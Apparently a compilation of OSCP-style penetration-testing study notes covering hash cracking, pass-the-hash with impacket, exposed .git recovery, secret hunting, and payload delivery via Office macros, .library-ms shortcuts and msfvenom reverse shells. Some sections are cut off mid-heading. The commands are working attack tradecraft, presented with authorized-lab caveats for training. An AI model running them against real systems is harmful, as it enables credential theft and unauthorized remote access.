Mask and session variants ```bash hashcat -m MODE hashes.txt -a 3 '?u?l?l?l?l?d?d?d' --session targeted-mask hashcat --session targeted-mask --restore ``` > Mask order is a hypothesis about structure. Estimate its keyspace before committing time.
Hybrid variant — base word plus three digits ```bash hashcat -a 6 -m MODE hashes.txt wordlist.txt '?d?d?d' --session targeted-hybrid ``` Use only when evidence supports both the base words and suffix shape.
## John the Ripper workflow ```bash john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt john --show hash.txt ``` ```bash john --format=FORMAT --wordlist=wordlist.txt --rules=Jumbo hash.txt john --session=crack-job --wordlist=wordlist.txt hash.txt john --restore=crack-job ``` File-to-hash converters: ```bash zip2john archive.zip > archive.hash 7z2john archive.7z > archive.hash ssh2john id_rsa > ssh.hash keepass2john vault.kdbx > keepass.hash pdf2john document.pdf > pdf.hash office2john document.docx > office.hash rar2john archive.rar > rar.hash unshadow passwd.copy shadow.copy > linux.hash ``` Converter availability varies by package/path; locate it rather than assuming: ```bash command -v ssh2john || find /usr/share/john -maxdepth 2 -iname '*2john*' 2>/dev/null ``` > Preserve the complete converter output. Some formats include a filename label before `:` that John accepts but Hashcat may require removed from a separate tool-specific copy. ## KeePass database ```bash keepass2john vault.kdbx > keepass.hash john --wordlist=wordlist.txt keepass.hash john --show keepass.hash ``` Hashcat alternative after confirming KDBX/KDF and input format: ```bash hashcat -hh | grep -i keepass hashcat -a 0 -m 13400 keepass.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 13400 keepass.hash --show ``` > Mode `13400` covers common KeePass 1/2 AES formats. Installed help and example hashes decide for the actual file. A recovered master password still requires opening and validating the vault. ## SSH private-key passphrase ```bash ssh2john id_rsa > ssh.hash john --wordlist=wordlist.txt ssh.hash john --show ssh.hash chmod 600 id_rsa ssh-keygen -y -f id_rsa > derived.pub ssh -vv -i id_rsa -o IdentitiesOnly=yes -p PORT USER@TARGET ``` > Cracking a key passphrase unlocks the file; it does not prove the matching public key is authorized. `Permission denied (publickey)` can mean wrong user/server, missing authorization or server algorithm/policy after a successful local unlock.
Hashcat variant — only for a supported OpenSSH format ```bash hashcat -hh | grep -i 'OpenSSH\|Private Key' hashcat -a 0 -m MODE ssh.hash wordlist.txt -r RULE_FILE ``` Choose `MODE` from the complete `$sshng$...` structure and installed help. Token-length or unsupported-cipher errors require a compatible parser/tool, not `--force` with a wrong mode.
## Linux password records ```bash unshadow passwd.copy shadow.copy > linux.hash john --wordlist=wordlist.txt --rules=Jumbo linux.hash john --show linux.hash ``` > Preserve username, UID, shell and lock markers. A recovered password does not override SSH settings, `su` policy or a disabled account. ## NT hash Offline recovery: ```bash hashcat -a 0 -m 1000 nt.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule john --format=NT --wordlist=wordlist.txt nt.hash ``` Compatible SMB validation: ```bash nxc smb TARGET -d DOMAIN -u USER -H NT_HASH --shares smbclient //TARGET/SHARE -U 'DOMAIN\USER' --pw-nt-hash NT_HASH ``` > NT hashes come from a producing context such as SAM, LSASS or NTDS. A visually similar 32-hex application digest is not PtH material.
Variant — remote access/execution when the identity has matching rights ```bash impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' xfreerdp /v:TARGET /u:'DOMAIN\USER' /pth:NT_HASH /cert:ignore ``` WMI needs administrative rights plus DCOM/RPC/SMB reachability and normally runs as the authenticated user. PsExec-style execution needs service-control and writable-share rights and commonly yields SYSTEM. RDP hash authentication depends on target/client support and policy. Detailed method selection belongs to the lateral-movement procedure.
## Net-NTLMv2 response ```bash hashcat -a 0 -m 5600 netntlmv2.hash wordlist.txt john --format=netntlmv2 --wordlist=wordlist.txt netntlmv2.hash ``` > A Net-NTLMv2 response is not an NT hash and cannot be supplied to `-H` or `-hashes`. Relay forwards a live authentication exchange and requires received/coerced authentication, compatible protocols, signing/channel-binding conditions and useful rights. The OSCP+ exam prohibits spoofing, including NBNS. Do not use Responder poisoning on the exam. Keep capture/relay work to explicitly authorized labs and recheck the current guide. ## DCC2 / cached domain logon ```bash hashcat -hh | grep -i 'Domain Cached' john --format=mscash2 --wordlist=wordlist.txt dcc2.hash ``` > Preserve the username because it participates in the verifier. DCC2 is an offline recovery target, not ordinary PtH material. ## Kerberos tickets and caches Inspect before use: ```bash klist KRB5CCNAME=TICKET.ccache klist impacket-ticketConverter TICKET.kirbi TICKET.ccache ``` Compatible client example: ```bash export KRB5CCNAME=TICKET.ccache impacket-wmiexec -k -no-pass 'DOMAIN/USER@HOST.DOMAIN' ``` > Verify client principal, realm, TGT versus service ticket, SPN, start/end time, clock, DNS/FQDN and routes. A readable cache does not prove authorization. Roasting, forging and detailed PtT/overpass belong to the AD procedures. ## Credential Guard boundary ```powershell Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesConfigured,DeviceGuardSecurityServicesRunning ``` Credential Guard can isolate reusable domain secrets from ordinary LSASS memory. It does not erase local SAM, file, vault, DPAPI, ticket, service-configuration or directory-right paths. One failed dump method disproves only that method and context. Intrusive SSP interception changes system state and waits for a future logon; it is not the default Block 5 response. ## Failure routing | Failure | Interpretation / next action | | --- | --- | | Timeout/no route | Fix source position, pivot or service reachability before judging the credential | | Wrong TLS/protocol response | Reconfirm application and required transport | | Local/domain/UPN mismatch | Retry only an evidence-backed identity form | | Account disabled/locked/expired/restricted | Stop guessing; preserve possible credential validity and record state | | Password/public-key/NTLM/Kerberos method rejected | Choose material/client compatible with server policy | | Authentication succeeds, requested action fails | Credential is valid; enumerate authorization and another relevant service | | Hash parser rejects input | Recheck complete line, prefix, converter, mode and version | | Key unlocks but SSH rejects it | Recheck user, server, authorized-key state and algorithm policy | | Ticket loads but service rejects it | Check expiry, SPN, realm, clock, DNS and service authorization | | PtH login succeeds but execution fails | Check admin rights, UAC remote restrictions and method-specific ports/rights | ## Re-enumerate after success ```text accepted identity -> groups/roles -> reachable services -> shares/files -> authenticated application behavior -> accessible hosts/routes -> new credentials/tickets/sessions -> privilege and movement handoffs ``` Verify destination host, accepted identity and actual read/write/execute rights. New hosts/listeners return to discovery; recovered material returns here; operating-system execution enters session handling; domain identities enter AD mapping. ## Build a small site-specific wordlist with CeWL Use when observed organization, product or account vocabulary could improve an offline recovery attempt. Keep the crawl on the assigned site. ```bash # Bounded crawl: depth 1, words of at least five characters cewl -d 1 -m 5 --lowercase -w site-words.txt http://TARGET:PORT/ # Review before using it in the existing format-specific recovery command head -n 30 site-words.txt wc -l site-words.txt ``` Read: useful vocabulary is a candidate list, not a recovered password. An authenticated or JS-only page may expose little to the crawler. Use the already identified Hashcat/John format, then apply a small relevant rule/mask rather than immediately creating an enormous list. Sources: [upstream 1](https://github.com/digininja/CeWL). ## Generate usernames from observed naming conventions Use when you have names and at least one real account/email that reveals a likely format. Put only relevant names in names.txt. ```bash # Review supported format names in this installed version ./username-anarchy --list-formats # Restrict output to plausible formats rather than every permutation ./username-anarchy -i names.txt -f first,first.last,flast,f.last > users.txt sort -u users.txt -o users.txt ``` Read: these are candidates. Confirm names with authorized directory/user enumeration; an email local part is not automatically a domain account. Keep domain, local-machine and application namespaces distinct. Use Kerbrute's username probe only when the KDC path and domain are known. Sources: [upstream 1](https://github.com/urbanadventurer/username-anarchy). ## Targeted candidates — Crunch, CUPP and rules Use a mask/profile only when evidence justifies it. This example expands a known six-character stem with three digits; it creates 1,000 candidates. ```bash crunch 9 9 -t 'foobar%%%' -o stem-digits.txt # Interactive profile-based alternative, when relevant clues exist python3 cupp.py -i # Preview a rule expansion before choosing the recovery job hashcat --stdout site-words.txt -r /usr/share/hashcat/rules/best64.rule | head -n 40 ``` Read: calculate candidate count and use the matching offline format. CUPP asks questions; invented personal details do not improve the list. A three-digit suffix or a rule is a hypothesis, not a reason to spray every generated value at an online login. Sources: [upstream 1](https://www.kali.org/tools/crunch/) · [upstream 2](https://github.com/Mebus/cupp) · [upstream 3](https://hashcat.net/wiki/). ## Password-protected ZIP — direct test or extracted verifier Use when the artifact is an encrypted ZIP and its encryption is supported by the selected tool. ```bash # Dictionary attack; -u checks candidates by attempting extraction fcrackzip -u -D -p WORDLIST archive.zip # Alternative: extract a verifier for John, preserving the original archive zip2john archive.zip > archive.hash john --wordlist=WORDLIST archive.hash john --show archive.hash ``` Read: confirm a candidate by opening/extracting the intended file. An unsupported encryption type or empty verifier is a format/tool issue, not proof that the password is unguessable. Reuse the recovered value only after identifying its account/service context. Sources: [upstream 1](https://www.kali.org/tools/fcrackzip/) · [upstream 2](https://www.openwall.com/john/). ## HTTP Basic authentication — validate the challenge and failure signal Use when the endpoint returns a real HTTP Basic challenge. A custom HTML login form is a different mechanism. ```bash curl -i http://TARGET:PORT/PROTECTED_PATH curl -i --basic -u USER http://TARGET:PORT/PROTECTED_PATH # Only when bounded online guessing is justified by scope and lockout controls hydra -l USER -P WORDLIST -s PORT -t 1 -f TARGET http-get /PROTECTED_PATH ``` Read: distinguish an accepted HTTP identity from permission to the protected function. Confirm a reported success with curl/browser. Redirects, uniform 200 pages or a mismatched realm/path make weak success detectors; fix the request before increasing guesses. Sources: [upstream 1](https://github.com/vanhauser-thc/thc-hydra) · [upstream 2](https://curl.se/docs/manpage.html). ## Change an account’s own expired/known SMB password Use when you know the old password and the account is allowed or required to change it. This is not an administrative reset of another account. ```bash # Prompts for the old and new password on the specified server/DC smbpasswd -r DC_HOST -U 'DOMAIN/USER' ``` Read: a successful change means subsequent password logins need the new value; existing ticket/session contexts do not automatically become new logons. Failure → check account scope, password policy, connectivity and change-password rights. Test the new password with the relevant native service client before moving on. Sources: [upstream 1](https://www.samba.org/samba/docs/current/man-html/smbpasswd.8.html). ## Generate a bounded numeric list for an observed identifier pattern Use when actual examples indicate a small numeric ID/range. Keep generated input separate from the decision to send online requests. ```bash # Unpadded IDs seq 0 999 > numbers.txt # Fixed-width values, only when the observed application uses that format seq -w 0 999 > numbers-padded.txt ``` Read: a matching format is a candidate input list, not permission to enumerate every object. Use the real session and compare owned/other/disallowed-object controls in the existing authorization workflow. Expand the range only when returned evidence justifies it. Sources: [upstream 1](https://www.gnu.org/software/coreutils/manual/html_node/seq-invocation.html). ## An application authenticates to your explicit SMB endpoint Use only when an observed application/file-request primitive can contact an explicitly supplied SMB path and the network/account policy permits NTLM. This workflow does not poison names or spoof network identities. ```bash # Attacker: serve the intended directory and keep the authentication log mkdir -p share sudo impacket-smbserver SHARE ./share -smb2support 2>&1 | tee smb-server.log # A captured Net-NTLMv2 line is an offline-recovery artifact, not an NT hash hashcat -m 5600 netntlmv2.txt WORDLIST hashcat -m 5600 netntlmv2.txt --show ``` Supply the actual application with the intended `\\LHOST\SHARE\FILE` path only through the already verified input mechanism. Read: retain the entire challenge-response line and the reported account/domain. No callback can be routing, SMB egress or NTLM policy; a callback without recoverable credentials is not a password. Validate a recovered plaintext password in the matching identity. Do not substitute this response for the NT hash expected by pass-the-hash tools. Sources: [upstream 1](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) · [upstream 2](https://hashcat.net/wiki/doku.php?id=example_hashes). ## Sources - [getSH Password Cracking route](https://lizajose.github.io/getSH/password-cracking), source snapshot [`e1f62dd`](https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98) - Supplied PEN-200 Chapter 16, pp442-493 - [Hexdump Windows hash and credential sections](https://github.com/LeonardoE95/OSCP/blob/main/modules/windows/windows-privesc-cheatsheet.txt) - [Current OSCP+ Body of Knowledge](https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge) - [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) - [John the Ripper documentation](https://www.openwall.com/john/doc/) - [Hydra official repository](https://github.com/vanhauser-thc/thc-hydra) - [NetExec credential use](https://www.netexec.wiki/getting-started/using-credentials) - [Impacket official repository](https://github.com/fortra/impacket) - [OpenSSH manual](https://man.openbsd.org/ssh) - [Current OSCP+ exam guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)

# file and repository hunting

[← stage index](readme.md) | [http mapping](../02-service-enumeration/10-http-web-mapping.md) | [credential handling](03-credential-use-and-cracking.md) | [strategy map](../../notes/attack_strategy_map.md) | study methods: [map useful web behavior](../../notes/methods/web-mapping.md); [escalate privileges on linux](../../notes/methods/linux-privesc.md); [escalate privileges on windows](../../notes/methods/windows-privesc.md)

## exposed git metadata

```bash
curl -ski http://target:port/.git/head
curl -ski http://target:port/.git/config
```

> a readable `head`/`config` supports exposed repository metadata. a `403`, redirect or generic template is not proof. preserve the correct host header/base path.

if authorized, recover into a new local directory with a purpose-built tool and inspect locally:

```bash
git-dumper http://target:port/.git/ repo-output
git -c repo-output status
git -c repo-output log --oneline --all --decorate
git -c repo-output log -p --all
```

`git-dumper` is an optional third-party helper; install on demand in an isolated environment only when the exposure has been confirmed. manual object recovery is possible but slower.

## repository secret/history search

```bash
rg -ni 'password|passwd|token|secret|api[_-]?key|private[_-]?key' repo-output
git -c repo-output log --all -s'password' --oneline
git -c repo-output log --all -g'pass(word)?|secret|token' --oneline
```

inspect candidate commits without dumping all history:

```bash
git -c repo-output show commit -- path
git -c repo-output diff commit^ commit -- path
```

validate freshness, identity and compatible use. removed historical values are often rotated or environment-specific.

## linux scoped file hunting

```bash
find /home /var/www /opt /srv -type f \
  \( -iname '*.conf' -o -iname '*.ini' -o -iname '*.env' -o -iname '*.bak' \
     -o -iname '*.old' -o -iname '*.key' -o -iname '*.pem' \) 2>/dev/null

rg -ni 'password|passwd|token|secret|api[_-]?key|connection(string)?' \
  /var/www /opt /srv 2>/dev/null
```

## windows scoped file hunting

```powershell
get-childitem c:\users,c:\programdata,c:\inetpub -file -recurse -erroraction silentlycontinue |
  where-object { $_.name -match 'pass|cred|config|backup|unattend|\.env' }
```

```powershell
get-childitem c:\users,c:\programdata,c:\inetpub -file -recurse -erroraction silentlycontinue |
  where-object { $_.extension -in '.config','.xml','.ini','.txt','.ps1','.bat','.cmd' } |
  select-string -pattern 'password|passwd|secret|token|connectionstring' -casesensitive:$false
```

avoid searching the entire filesystem without a reason; scope reduces noise, access errors and sensitive-data overcollection.

## exposed .git — recover source and old configuration

use after a real `.git/head` response, not a generic 200/default page. gittools can recover accessible objects even when directory listing is disabled; missing objects can still leave an incomplete repository.

```bash
curl -i http://target:port/.git/head
bash gittools/dumper/gitdumper.sh http://target:port/.git/ recovered-git/
bash gittools/extractor/extractor.sh recovered-git/ recovered-files/

# inspect recovered history and a specific revision; do not run recovered code
git -c recovered-git log --all --oneline
git -c recovered-git show commit:path/to/file
```

read: connection strings, routes, secret-handling code and removed credentials can identify the next request or account to test. verify a recovered value in its actual context. a repository skeleton or one head file does not prove complete recovery; inspect extractor output and errors before concluding that a file never existed.

sources: [upstream 1](https://github.com/internetwache/gittools).


## sources

- [getsh useful stuff: git & file hunting](https://lizajose.github.io/getsh/useful-stuff?section=git-files), source snapshot [`e1f62dd`](https://github.com/lizajose/getsh/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98)
- [git-dumper](https://github.com/arthaud/git-dumper)
- [git log documentation](https://git-scm.com/docs/git-log)

# python tool environments

[← stage index](readme.md) | [tool selection matrix](../../cheatsheets/tool-selection.md) | [strategy map](../../notes/attack_strategy_map.md) | study methods: [select and adapt public exploits](../../notes/methods/public-exploits.md)

> **use when:** a source-based python assessment tool has dependencies that should not modify kali's system python. this is setup/reference material, not authorization to install a tool.

## linux/kali virtual environment

```bash
python3 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
python -m pip install -r requirements.txt
```

install one explicitly selected package only when needed:

```bash
python -m pip install package
```

```bash
python -m pip show package
python -m pip freeze
deactivate
```

pep 668 intentionally protects externally managed system environments. do not bypass it with `--break-system-packages`; use a venv or the distribution package when appropriate.

## windows powershell


# payload execution obstacles

[← stage index](readme.md) | [shells and payloads](02-shells-and-payloads.md) | [file transfer](01-file-transfer.md) | [payload-execution cheatsheet](../../cheatsheets/payload-execution.md) | [strategy map](../../notes/attack_strategy_map.md) | study methods: [resolve payload execution obstacles](../../notes/methods/execution.md)

> **goal:** determine the first failed boundary between delivery and a usable session, then change only the condition responsible. commands are generic authorized-lab references. client-side delivery requires explicit scope and the intended exercise user interaction.

## 1. preserve the execution chain

```text
artifact/request
→ delivered to intended consumer
→ required user/trigger action
→ parser/interpreter/loader
→ process or bounded side effect
→ network connection
→ handler protocol
→ usable session
```

| boundary | decisive evidence | does not prove |
| --- | --- | --- |
| delivery | expected bytes, request, document or shortcut arrives intact | it was opened or parsed |
| trigger | intended user/service/parser consumed it | child process started |
| execution | harmless marker, process or command output | callback route works |
| connection | expected peer reaches listener | payload and handler agree |
| session | commands return; host and identity verified | stability or privilege |

do not replace the artifact, payload, listener and route simultaneously. record the last confirmed boundary and test the next one.

## 2. fast diagnostic order

1. reproduce a harmless direct command in the exact vulnerable or user context.
2. confirm file/request integrity, final path and consumer.
3. identify every parser, interpreter and loader.
4. match target os, process architecture, artifact format and runtime dependencies.
5. verify permissions, working directory, execution policy and application-control evidence.
6. start the correct listener/handler and prove its bind.
7. prove the target-to-listener route separately.
8. inspect concrete antimalware, application-control and process-failure evidence.
9. repair session i/o only after a connection exists.

if step 1 fails, this is not yet a payload problem. return to the exploit, input parser or execution primitive.

## 3. client-side attacks are gated chains

client-side access adds two prerequisites that service exploitation does not normally have:

- the artifact must reach the intended user and application;
- the user or application must perform the action that reaches the execution sink.

before choosing a document or shortcut, establish the target os, installed application/version, delivery route, expected security zone, required interaction, target egress and callback route. a generic file that depends on absent software is not a viable attack.

### 3.1 office macro chain

use a macro-enabled format such as `.docm` or a legacy `.doc`; `.docx` does not persist embedded vba macros by itself. store the macro in the document, not only the global template. a minimal harmless execution proof is:

```vb
sub autoopen()
    runproof
end sub

sub document_open()
    runproof
end sub

sub runproof()
    createobject("wscript.shell").run _
        "cmd.exe /c whoami > %temp%\oscp-marker.txt", 0, true
end sub
```

`autoopen` and `document_open` cover distinct word opening paths. replace the proof command only after the document, trigger and execution context are confirmed.

modern office commonly blocks vba macros in files carrying mark of the web rather than offering a universal one-click enable path. relevant gates include:

- file format actually supports the macro;
- macro is stored in the delivered document;
- motw/zone identifier and security zone;
- protected view and trust center settings;
- signed publisher or trusted location decisions;
- organization gpo that the user cannot override;
- user opened the document and performed the required permitted action;
- office launched the expected child process;
- the child command survived vba, cmd and powershell quoting;
- delivery and callback network paths both work.

inspect a file's zone without changing it:

```powershell
get-item -literalpath 'c:\path\file.docm' -stream *
get-content -literalpath 'c:\path\file.docm' -stream zone.identifier
```

`zoneid=3` represents the internet zone. absence of the stream does not prove that macro policy permits execution, and removing motw does not override every policy.

### 3.2 windows library file plus shortcut

a `.library-ms` file is an xml library description that can present a remote location in explorer. the pen-200 attack pattern is two-stage:

```text
delivered .library-ms
→ user opens library
→ explorer reaches webdav location
→ user opens .lnk
→ shortcut launches chosen command
→ optional download/callback
```

if wsgidav is already installed, publish a dedicated authorized-lab directory:

```bash
mkdir -p webdav
wsgidav --host=0.0.0.0 --port=80 \
  --root=./webdav --auth=anonymous
```

> anonymous mode exposes the selected directory. bind only to the required lab interface when possible, place no sensitive files there and stop the server after the exercise.
> port 80 is the reliable baseline for a plain-http windows webdav location. use another port only after confirming the target webclient accepts that url form and the route permits it.

original library template using placeholders:

```xml
<?xml version="1.0" encoding="utf-8"?>
<librarydescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>1</version>
  <islibrarypinned>true</islibrarypinned>
  <iconreference>imageres.dll,-1002</iconreference>
  <templateinfo>
    <foldertype>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</foldertype>
  </templateinfo>
  <searchconnectordescriptionlist>
    <searchconnectordescription>
      <isdefaultsavelocation>true</isdefaultsavelocation>
      <issupported>false</issupported>
      <simplelocation>
        <url>http://lhost/</url>
      </simplelocation>
    </searchconnectordescription>
  </searchconnectordescriptionlist>
</librarydescription>
```

save it with a `.library-ms` extension. windows may add a serialized location after opening it; retain a clean source copy and inspect the final artifact before delivery.

create a shortcut on a controlled windows preparation host:

```powershell
$shortcutpath = 'c:\path\webdav\action.lnk'
$shell = new-object -comobject wscript.shell
$shortcut = $shell.createshortcut($shortcutpath)
$shortcut.targetpath = "$env:systemroot\system32\cmd.exe"
$shortcut.arguments = '/c whoami > %temp%\oscp-marker.txt'
$shortcut.workingdirectory = $env:temp
$shortcut.iconlocation = "$env:systemroot\system32\imageres.dll,11"
$shortcut.save()
```

only after the harmless marker works, substitute a command compatible with the target and the separately proven callback route. diagnose this chain at three independent network points:

```text
explorer → webdav
shortcut command → optional payload/download server
executed payload → listener/handler
```

failure cues:

| observation | next boundary |
| --- | --- |
| library opens empty | webdav bind, reachability, webclient/policy, modified library serialization |
| webdav receives nothing | artifact not opened, url/port wrong, client route or webdav blocked |
| directory appears; shortcut never runs | required second user action absent or shortcut blocked |
| marker works; download absent | command quoting, dns and payload-server route |
| download occurs; no execution | format, permissions, policy, quarantine or dependency |
| execution proven; no callback | listener, route, payload/handler compatibility |

## 4. match artifact to its consumer

the file extension is not the execution contract. record all of these:

```text
target os and build
target process architecture
artifact format
loader/interpreter
execution identity and integrity
working directory and path
required runtime/libraries
arguments and quoting
network direction
handler protocol
```

### 4.1 linux checks

```bash
uname -a
uname -m
file payload
readelf -h payload | sed -n '1,25p'
ldd payload
ls -l payload
findmnt -t /path/to/payload
head -n 1 script
```

common interpretations:

- `exec format error`: wrong format/architecture or invalid interpreter line;
- `permission denied`: missing execute permission, inaccessible parent directory, `noexec`, policy or identity issue;
- `no such file or directory` when the file exists: missing dynamic loader or broken shebang interpreter;
- missing shared object: runtime library mismatch;
- `^m` in a shebang: crlf line endings changed the interpreter path;
- works interactively but not through cron/service: environment, working directory, shell, identity or route differs.

### 4.2 windows checks

```powershell
get-ciminstance win32_operatingsystem |
  select-object caption,version,buildnumber,osarchitecture

[environment]::is64bitoperatingsystem
[environment]::is64bitprocess
$env:processor_architecture
get-authenticodesignature -filepath 'c:\path\payload.exe'
```

keep os architecture and consumer-process architecture separate. a 64-bit os can run a 32-bit process under wow64; injected code and dlls must match the process they enter. a normal executable is not necessarily a service executable, dll, msi or script:

| consumer | required property / common failure |
| --- | --- |
| direct process creation | compatible pe/elf/script and dependencies |
| windows service | service-compatible entry/control behavior; error 1053 may follow execution of a non-service program |
| dll loader/hijack | correct bitness, expected exports and dependency behavior |
| `msiexec` | valid msi package, not an exe renamed `.msi` |
| powershell | valid syntax, edition/runtime compatibility and applicable policy/control state |
| existing memory-corruption poc | documented architecture, space, bad characters and exit behavior |

## 5. parser, command-line and length failures

write the real chain:

```text
document/shortcut or http/sql/template input
→ application parser
→ vba/wscript/application runtime
→ cmd.exe /c, /bin/sh -c or powershell
→ final command/payload
```

start with a short marker at every layer. check:

- quote ownership at each layer;
- expansion of `%var%`, `$var` and powershell variables;
- metacharacters such as `&`, `|`, `<`, `>`, `;`, backticks and parentheses;
- url/json/xml/base64 decode count;
- command-line, vba-string, request-field or exploit-buffer length;
- current directory and relative paths.

powershell encoded-command preparation:

```powershell
$command = 'command'
$bytes = [text.encoding]::unicode.getbytes($command)
[convert]::tobase64string($bytes)
```

```cmd
powershell.exe -noprofile -noninteractive -encodedcommand base64_utf16le
```

`-encodedcommand` uses utf-16le. it solves some transport/quoting problems; it is not encryption and does not establish antimalware evasion.

## 6. powershell control layers

do not merge these different controls:

| control | what it changes | useful evidence |
| --- | --- | --- |
| execution policy | conditions for loading/running scripts | `get-executionpolicy -list` and exact error |
| language mode | available powershell language features | `$executioncontext.sessionstate.languagemode` |
| amsi | submits supported script/content to antimalware | explicit block/error plus defender/powershell events |
| applocker/wdac | application/script allow policy | effective policy and application-control events |
| defender/other av | file, memory, behavior and network decisions | status, detection history, quarantine/events |
| permissions | file/process/service/token rights | access-denied result under named identity |

read-only checks:

```powershell
get-executionpolicy -list
$executioncontext.sessionstate.languagemode

get-mpcomputerstatus |
  select-object antivirusenabled,realtimeprotectionenabled,
    behaviormonitorenabled,ioavprotectionenabled,antivirussignatureversion

get-mpthreatdetection |
  select-object initialdetectiontime,threatid,actionsuccess,resources

get-applockerpolicy -effective -xml

get-winevent -logname 'microsoft-windows-windows defender/operational' `
  -maxevents 50 -erroraction silentlycontinue |
  select-object timecreated,id,leveldisplayname,message

get-winevent -logname 'microsoft-windows-applocker/exe and dll' `
  -maxevents 50 -erroraction silentlycontinue |
  select-object timecreated,id,message

get-winevent -logname 'microsoft-windows-applocker/msi and script' `
  -maxevents 50 -erroraction silentlycontinue |
  select-object timecreated,id,message
```

cmdlets, logs and fields vary by edition, installed modules, permissions and control product. missing output is inconclusive.

execution policy is defense in depth, not a windows security boundary. a process-scoped policy setting may change script-loading behavior when gpo does not override it:

```cmd
powershell.exe -noprofile -executionpolicy bypass -file c:\path\script.ps1
```

this does not disable amsi, application control, antimalware, permissions or network controls. do not change persistent machine/user policy merely to test a payload.

## 7. interpret control evidence

| observation | most useful next action |
| --- | --- |
| transferred hash differs | repair transfer/encoding before execution |
| file arrives then vanishes | inspect quarantine/detection events and resource path |
| file remains; process creation denied | inspect applocker/wdac, permissions and parent process |
| script-loading policy error | inspect scope/precedence; use an authorized process-only invocation if applicable |
| explicit amsi/content block | treat content/control as confirmed; encoding alone is not a supported conclusion |
| process starts then exits | capture exit/error, dependency and architecture evidence |
| process remains; no connection | test target egress, lhost and listener |
| tcp handshake then close | handler/payload mismatch, stage failure, crash or control interruption |

modern protection can inspect files, scripts after decoding, process memory, behavior and network activity. therefore:

- changing a filename does not imply a new payload;
- base64 does not imply concealment from amsi;
- an in-memory technique is not automatically invisible;
- an encoder is primarily useful for transport/bad-character constraints, not guaranteed av bypass;
- a clean third-party scanner result does not prove execution on the target and may disclose a private sample.

prefer the least complex route already supported by evidence: a direct command, native interpreter, authenticated management service or simple command shell may meet the objective without a custom binary. deep shellcode development, process-injection implementation and generalized av-bypass recipes are outside this speedrun.

## 8. generate only after selecting the context

```bash
msfvenom -l payloads | grep -e 'linux|windows' | grep -e 'x64|x86'
msfvenom --list formats
msfvenom -p payload_name --list-options
```

baseline stageless command shells:

```bash
msfvenom -p linux/x64/shell_reverse_tcp \
  lhost=lhost lport=lport \
  -f elf -o shell.elf

msfvenom -p windows/x64/shell_reverse_tcp \
  lhost=lhost lport=lport \
  -f exe -o shell.exe

file shell.elf shell.exe
sha256sum shell.elf shell.exe
```

existing reviewed poc with documented byte restrictions:

```bash
msfvenom -p payload_name \
  lhost=lhost lport=lport \
  exitfunc=thread \
  -f format -v variable \
  -b 'bad_characters' -s max_space
```

use `exitfunc` only when the exploit/consumer requires that termination behavior. never invent bad characters or size limits.

staging distinction:

```text
windows/x64/shell_reverse_tcp  single/stageless
windows/x64/shell/reverse_tcp  staged
```

a staged payload first connects and asks its handler for the larger stage. a raw netcat listener cannot supply that protocol.

## 9. multi/handler and session lifecycle

matching handler:

```text
msfconsole -q
use exploit/multi/handler
set payload payload_name
set lhost lhost
set lport lport
set exitonsession false
show options
run -j
```

manage the resulting job/session deliberately:

```text
jobs -l
sessions -l
sessions -i session_id
background
sessions -k session_id
jobs -k job_id
```

`exitonsession false` keeps the handler available after a session opens. `run -j` backgrounds the handler. a session id is local to that framework instance; record the target, identity, payload and listener rather than relying on the number alone.

handler failure cues:

| output | interpretation |
| --- | --- |
| handler never binds | bad local address, occupied port or privilege issue |
| raw listener receives connection; framework does not | different port/interface or payload transport |
| handler receives connection but no session | exact payload/stager mismatch, stage blocked or crash |
| session opens then dies | parent exits, payload exit behavior, route/control or process crash |
| session opens as unexpected architecture/type | default payload or target was not explicitly selected |

## 10. metasploit module workflow and exam boundary

manual module inspection:

```text
search type:exploit cve:cve_id
info module_path
use module_path
show options
show advanced
show targets
show payloads
set rhosts target
set rport port
set target target_id
set payload payload_name
set lhost lhost
set lport lport
show missing
run
```

interpretation rules:

- module rank describes expected exploit stability, not target vulnerability;
- `check` is an active module operation and does not prove exploitability when unsupported or inconclusive;
- target ids, default payloads and options vary by module/version;
- automatic target selection is still an assumption to verify;
- a module's success message is weaker than a verified session, host and identity;
- `setg` persists values across modules and can silently aim later work at the wrong host; prefer local `set` unless global state is intentionally tracked.

current oscp+ restriction:

- `msfvenom` and `exploit/multi/handler` may be used against all targets, except that a meterpreter payload remains subject to the one-target limit;
- any metasploit auxiliary, exploit or post module—or meterpreter payload—locks the selection to one target, even if `check` or the attack fails;
- metasploit pivoting is prohibited;
- automatic exploitation tools are prohibited.

use manual/source-reviewed exploitation as the reusable baseline. decide on the restricted metasploit target deliberately and record that decision before using a restricted module or meterpreter.

## 11. worked diagnostic paths

### a. document delivered, no callback

```text
observed: document exists
unknown: opened, macro permitted, child command, network route
test: motw/policy → harmless marker → child process/download → callback route
action: repair first failed gate; do not regenerate the payload first
```

### b. executable disappears after transfer

```text
observed: transfer response succeeded
test: destination listing/hash → defender detection/resource/event
interpretation: transfer success is not retention; quarantine requires evidence
action: choose a justified alternate execution form or native route, within scope
```

### c. powershell says scripts are disabled

```text
observed: explicit execution-policy error
test: get-executionpolicy -list and gpo precedence
action: use a process-scoped invocation if allowed; do not call this an amsi result
```

### d. connection reaches netcat but there is no shell

```text
observed: tcp connection
test: generated payload name
interpretation: staged payload may have reached a raw listener
action: use exact multi/handler or generate a compatible stageless command shell
```

### e. binary exists but returns “not found” on linux

```text
observed: path and file exist
test: file, readelf interpreter, ldd, shebang
interpretation: loader/interpreter dependency may be missing
action: build/choose a compatible artifact; do not change callback settings
```

### f. metasploit module reports completion, no session

```text
observed: module ran
test: exact target profile, payload, callback route, handler output and service state
interpretation: completion is not verified execution/session
action: preserve module output and diagnose the first missing state
```

## 12. evidence and cleanup

record:

